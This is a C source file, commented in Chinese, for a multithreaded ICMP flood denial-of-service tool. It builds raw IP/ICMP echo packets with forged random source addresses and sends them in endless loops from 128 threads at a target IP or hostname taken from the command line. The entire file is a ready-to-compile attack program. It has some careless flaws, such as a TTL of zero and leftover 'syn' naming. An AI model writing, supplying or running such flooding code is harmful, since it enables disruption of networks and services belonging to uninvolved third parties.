#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <error.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/wait.h>
#include <signal.h>
#include <netdb.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/time.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>

#define MAXCHILD 128           // 最多线程数
static unsigned long dest = 0; // 目的 IP 地址
static int alive = -1;
static int PROTO_ICMP = -1;
int rawsock = -1;

// 随机函数产生函数
static inline long myrandom(int begin, int end)
{
    int gap = end - begin + 1;
    int ret = 0;

    // 用系统时间初始化
    srand((unsigned)time(0));

    // 产生一个介于 begin 和 end 之间的值
    ret = rand() % gap + begin;

    return ret;
}

// ICMP 头部打包，打包并填充 IP 头部、ICMP 头部发送数据报文
static void DoS_icmp()
{
    struct sockaddr_in to;
    struct iphdr *iph;
    struct icmphdr *icmph;
    char *packet;
    int pktsize = sizeof(struct iphdr) + sizeof(struct icmphdr) + 64;
    packet = malloc(pktsize);

    iph = (struct iphdr *)packet;
    icmph = (struct icmphdr *)(packet + sizeof(struct iphdr));
    memset(packet, 0, pktsize);

    iph->version = 4;                               // IPv4 版本
    iph->ihl = 5;                                   // IP 头部长度字节数
    iph->tos = 0;                                   // 服务类型
    iph->tot_len = htons(pktsize);                  // IP 报文的总长度
    iph->id = htons(getpid());                      // 标识，设置为 PID
    iph->frag_off = 0;                              // 段的偏移地址
    iph->ttl = 0x0;                                 // 生存时间 TTL
    iph->protocol = PROTO_ICMP;                     // 协议类型
    iph->check = 0;                                 // 校验和，先填写为0
    iph->saddr = (unsigned long)myrandom(0, 65535); // 发送源地址
    iph->daddr = dest;                              // 发送目标地址

    icmph->type = ICMP_ECHO; // 回显请求
    icmph->code = 0;
    // 由于数据部分为 0 ，代码为 0 ，直接对不为 0 的部分 type 计算
    icmph->checksum = htons(~(ICMP_ECHO << 8));

    to.sin_family = AF_INET;
    to.sin_addr.s_addr = iph->daddr;
    to.sin_port = htons(0);

    sendto(rawsock, packet, pktsize, 0, (struct sockaddr *)&to, sizeof(struct sockaddr));

    free(packet);
    packet = NULL;
}

// 多线程协同进行 syn 连接
static void DoS_fun()
{
    while (alive)
    {
        DoS_icmp();
    }
}

static void DoS_sig(int signo)
{
    alive = 0;
    return;
}

int main(int argc, char *argv[])
{
    struct hostent *host = NULL;
    struct protoent *protocol = NULL;
    char protoname[] = "icmp";
    int i = 0;
    pthread_t pthread[MAXCHILD];
    int err = -1;

    alive = 1;
    signal(SIGINT, DoS_sig);
    if (argc < 2)
    {
        printf("usage: ./syn aaa.bbb.ccc.ddd\n");
        return -1;
    }

    protocol = getprotobyname(protoname); // 获取协议类型 ICMP
    if (protocol == NULL)
    {
        perror("getprotobyname()");
        return -1;
    }
    PROTO_ICMP = protocol->p_proto;

    dest = inet_addr(argv[1]); // 输入目的地址为字符串IP地址
    if (dest == INADDR_NONE)
    {
        host = gethostbyname(argv[1]); // 输入主机地址为DNS地址
        if (host == NULL)
        {
            perror("gethostbyname()");
            return -1;
        }
        // 将地址复制到 dest 中
        memcpy((char *)&dest, host->h_addr_list[0], host->h_length);
    }

    rawsock = socket(AF_INET, SOCK_RAW, PROTO_ICMP); // 建立原始 socket
    if (rawsock < 0)
    {
        perror("socket()");
        return -1;
    }

    setsockopt(rawsock, SOL_IP, IP_HDRINCL, "1", sizeof("1"));
    // 设置 IP 选项
    for (i = 0; i < MAXCHILD; i++)
    {
        if (pthread_create(&pthread[i], NULL, (void *)DoS_fun, NULL) != 0)
        {
            perror("pthread_create() failed");
            close(rawsock);
            return EXIT_FAILURE;
        }
    }

    for (i = 0; i < MAXCHILD; i++)
    {
        pthread_join(pthread[i], NULL);
    }
    close(rawsock);
    return 0;
}